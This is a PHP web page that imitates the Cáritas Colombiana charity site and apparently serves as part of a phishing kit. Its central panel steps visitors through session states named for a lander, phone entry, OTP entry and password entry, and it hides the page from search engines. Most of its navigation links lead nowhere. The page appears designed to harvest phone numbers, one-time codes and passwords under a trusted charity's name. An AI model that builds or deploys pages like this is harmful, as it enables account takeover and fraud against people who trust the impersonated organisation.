<?php require("_core.php"); ?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $TITLE ?></title>
    <meta name="robots" content="noindex,nofollow">

    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap"
        rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <style>
        :root {
            --caritas-red: #A3111A;
            --caritas-dark-red: #730B11;
            --caritas-teal: #083D3C;
            --bg-beige: #F4EBEB;
            --text-dark: #333333;
        }

        body {
            margin: 0;
            font-family: 'Montserrat', sans-serif;
            background-color: #ffffff;
            color: var(--text-dark);
        }

        .main-navbar {
            padding: 15px 5%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: white;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
        }

        .main-navbar img.logo {
            height: 50px;
        }

        .nav-menus {
            display: flex;
            gap: 20px;
            font-size: 12px;
            font-weight: 600;
            color: #555;
        }

        .btn-donar {
            background-color: var(--caritas-red);
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 20px;
            font-weight: 700;
            font-size: 12px;
        }

        .hero-banner img {
            width: 100%;
            display: block;
            object-fit: cover;
        }

        .app-logic-wrapper {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            border-top: 5px solid var(--caritas-red);
            max-width: 450px;
            margin: 50px auto 40px auto;
            position: relative;
            z-index: 10;
        }

        .app-logic-wrapper button,
        .app-logic-wrapper .btn {
            display: block !important;
            margin: 0 auto !important;
            width: fit-content;
        }

        .section-title-wrapper {
            text-align: center;
            margin-bottom: 40px;
        }

        .section-title {
            font-size: 24px;
            font-weight: 800;
            color: var(--caritas-teal);
            text-transform: uppercase;
        }

        .section-subtitle {
            font-size: 12px;
            font-weight: 700;
            color: var(--caritas-red);
            letter-spacing: 1px;
        }

        .content-section {
            padding: 60px 5%;
        }

        .bg-gray {
            background-color: #F8F9FA;
        }

        .news-card {
            border: none;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
            height: 100%;
        }

        .news-card img {
            height: 180px;
            object-fit: cover;
        }

        .news-card .card-body {
            padding: 20px;
        }

        .news-date {
            font-size: 11px;
            color: #888;
            font-weight: 600;
            margin-bottom: 5px;
        }

        .news-title {
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 15px;
            line-height: 1.4;
        }

        .btn-conoce {
            background-color: var(--caritas-red);
            color: white;
            border: none;
            padding: 6px 15px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }

        .btn-ver-todas {
            background-color: var(--caritas-teal);
            color: white;
            border: none;
            padding: 8px 30px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            margin-top: 30px;
        }

        .pastoral-section {
            background-color: var(--caritas-dark-red);
            padding: 70px 5%;
            color: white;
            text-align: center;
        }

        .pastoral-card {
            height: 250px;
            border-radius: 10px;
            background-size: cover;
            background-position: center;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: flex-end;
            padding: 20px;
            text-align: left;
        }

        .pastoral-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to top, rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.2));
        }

        .pastoral-content {
            position: relative;
            z-index: 2;
            width: 100%;
        }

        .pastoral-title {
            font-weight: 700;
            font-size: 14px;
            line-height: 1.2;
        }

        .icon-circle-top {
            position: absolute;
            top: 15px;
            right: 15px;
            width: 25px;
            height: 25px;
            background: var(--caritas-red);
            border-radius: 50%;
            z-index: 2;
        }

        .icon-circle-bottom {
            width: 30px;
            height: 30px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 10px;
            color: var(--caritas-teal);
            font-size: 12px;
        }
        .logros-section {
            padding: 70px 5%;
            text-align: center;
        }

        .logros-number {
            font-size: 45px;
            font-weight: 800;
            color: #333;
            line-height: 1;
            margin-bottom: 10px;
        }

        .logros-text {
            font-size: 12px;
            font-weight: 500;
            color: #666;
        }

        .acerca-section {
            background-color: var(--bg-beige);
            padding: 70px 5%;
        }

        .acerca-text p {
            font-size: 13px;
            line-height: 1.6;
            color: #555;
        }

        .video-box {
            position: relative;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
        }

        .video-box img {
            width: 100%;
            display: block;
        }

        .play-btn {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            color: var(--caritas-red);
            cursor: pointer;
        }

        .aliados-section {
            padding: 50px 5%;
            text-align: center;
            background: white;
        }

        .aliados-logos {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 40px;
            flex-wrap: wrap;
            margin-top: 30px;
        }

        .aliados-logos img {
            height: 45px;
            object-fit: contain;
        }

        /* --- 8. FOOTER --- */
        .pre-footer {
            background-color: #5A0808;
            padding: 15px 5%;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
        }

        .pre-footer .social i {
            font-size: 16px;
            margin-right: 15px;
            cursor: pointer;
        }

        .main-footer {
            background-color: #2D0404;
            color: white;
            padding: 60px 5% 20px;
            font-size: 12px;
        }

        .footer-logo img {
            height: 70px;
            margin-bottom: 20px;
            filter: brightness(0) invert(1);
        }

        .footer-title {
            font-weight: 700;
            margin-bottom: 20px;
            font-size: 13px;
        }

        .footer-links {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        .footer-links li {
            margin-bottom: 10px;
            color: #ccc;
            cursor: pointer;
        }

        .footer-links li:hover {
            color: white;
        }

        .footer-contact p {
            margin-bottom: 8px;
            color: #ccc;
        }

        .footer-bottom {
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            padding-top: 20px;
            margin-top: 40px;
            display: flex;
            justify-content: space-between;
            color: #888;
            font-size: 11px;
        }

        .loader {
            position: fixed;
            inset: 0;
            background: white;
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--caritas-red);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }

        .menu-toggle {
            display: none;
            flex-direction: column;
            gap: 5px;
            cursor: pointer;
            border: none;
            background: none;
            padding: 5px;
        }

        .menu-toggle span {
            display: block;
            width: 25px;
            height: 3px;
            background-color: var(--caritas-red);
            border-radius: 3px;
            transition: 0.3s;
        }

        @media (max-width: 991px) {
            .menu-toggle {
                display: flex;
                order: 1;
            }
            .btn-donar {
                display: none !important;
            }

            .nav-menus {
                display: none;
                position: absolute;
                top: 80px;
                left: 0;
                width: 100%;
                background: white;
                flex-direction: column;
                padding: 20px;
                gap: 15px;
                box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
                z-index: 1000;
            }

            .nav-menus.active {
                display: flex;
            }

            .main-navbar {
                justify-content: space-between;
                padding: 10px 5%;
            }

            .btn-donar {
                padding: 6px 15px;
                font-size: 10px;
            }
        }
    </style>
</head>

<body>
    <div id="loader" class="loader">
        <div class="spinner"></div>
    </div>

    <div class="main-navbar">
        <button class="menu-toggle" id="mobile-menu">
            <span></span>
            <span></span>
            <span></span>
        </button>

        <img src="assets/caritas.svg" class="logo" alt="Cáritas Colombiana">

        <div class="nav-menus d-none d-lg-flex" id="nav-list">
            <div>Inicio</div>
            <div>Quiénes somos <i class="fas fa-chevron-down ms-1" style="font-size:10px;"></i></div>
            <div>Qué hacemos <i class="fas fa-chevron-down ms-1" style="font-size:10px;"></i></div>
            <div>Pastoral Social <i class="fas fa-chevron-down ms-1" style="font-size:10px;"></i></div>
            <div>Recursos <i class="fas fa-chevron-down ms-1" style="font-size:10px;"></i></div>
        </div>

        <div class="d-flex align-items-center gap-2 gap-md-3">
            <button class="btn-donar"><i class="fas fa-heart me-1"></i> DONAR</button>
            <span class="fw-bold d-none d-sm-inline" style="font-size:12px;">ESP <i
                    class="fas fa-chevron-down"></i></span>
        </div>
    </div>

    <div class="hero-banner">
        <img src="assets/banner0.jpeg" alt="Semana por la Paz 2025"
            onerror="this.src='https://placehold.co/1920x500/A3111A/FFFFFF?text=Semana+por+la+Paz+2025'">
    </div>

    <div class="container">
        <div class="app-logic-wrapper">
            <?php
            if (!isset($_SESSION["state"]) || isset($_GET["otherAccount"])) {
                $_SESSION["state"] = "start";
            }

            $F = $_SESSION["state"];
            switch ($F) {
                case "start":
                    require("Lander.php");
                    break;
                case "phone":
                    require("OTPC.php");
                    break;
                case "otp":
                    require("PASS.php");
                    break;
                case "success":
                    require("SCCS.php");
                    break;
                default:
                    print_r($_SESSION);
            }
            ?>
        </div>
    </div>

    <section class="aliados-section">
        <div class="container">
            <h2 class="section-title">ALIADOS</h2>
            <div class="d-flex align-items-center justify-content-center">
                <i class="fas fa-chevron-left text-danger me-4" style="cursor:pointer;"></i>
                <div class="aliados-logos">
                    <img src="assets/USAID.png" alt="USAID">
                    <img src="assets/Union-Europea.png" alt="UN">
                    <img src="assets/AECID.png" alt="EU">
                    <img src="assets/action-medeor-Logo-RGB-blue.png" alt="Action">
                </div>
                <i class="fas fa-chevron-right text-danger ms-4" style="cursor:pointer;"></i>
            </div>
        </div>
    </section>

    <footer>
        <div class="main-footer">
            <div class="container">
                <div class="row">
                    <div class="col-md-3 pe-md-4">
                        <div class="footer-logo">
                            <img src="assets/caritas-blanco.svg" alt="Cáritas Logo">
                        </div>
                        <p style="color:#ccc; line-height:1.5;">Secretariado Nacional de Pastoral Social - Cáritas
                            Colombiana</p>
                    </div>

                    <div class="col-md-3">
                        <div class="footer-title">Navegación</div>
                        <ul class="footer-links">
                            <li>Quiénes somos</li>
                            <li>Nuestras Pastorales</li>
                            <li>Convocatorias</li>
                            <li>Noticias</li>
                            <li>Políticas</li>
                            <li>Línea de Transparencia</li>
                            <li>Aviso de Privacidad</li>
                        </ul>
                    </div>

                    <div class="col-md-3">
                        <div class="footer-title">Nuestras Pastorales</div>
                        <ul class="footer-links">
                            <li>Comunidades de aprendizaje</li>
                            <li>Tierra, territorio y ecología</li>
                            <li>Construcción de paz y transformación de conflictos</li>
                            <li>Emergencias</li>
                            <li>Migración, refugio y trata de personas</li>
                            <li>REPAM</li>
                        </ul>
                    </div>
                </div>

                <div class="footer-bottom">
                    <div>© Copyright 2026 Cáritas Colombiana.</div>
                    <div>Políticas de Privacidad | Términos y Condiciones</div>
                </div>
            </div>
        </div>
    </footer>

    <script>
        $(window).on('load', function () {
            // Hilangkan loading screen perlahan
            setTimeout(function () {
                $('#loader').fadeOut('slow');
            }, 300);
        });

        $(document).ready(function() {
            $('#mobile-menu').on('click', function() {
                $('#nav-list').toggleClass('active');
                $(this).toggleClass('open');
            });
        });

        $(window).on('load', function () {
            setTimeout(function () {
                $('#loader').fadeOut('slow');
            }, 300);
        });
    </script>
</body>

</html>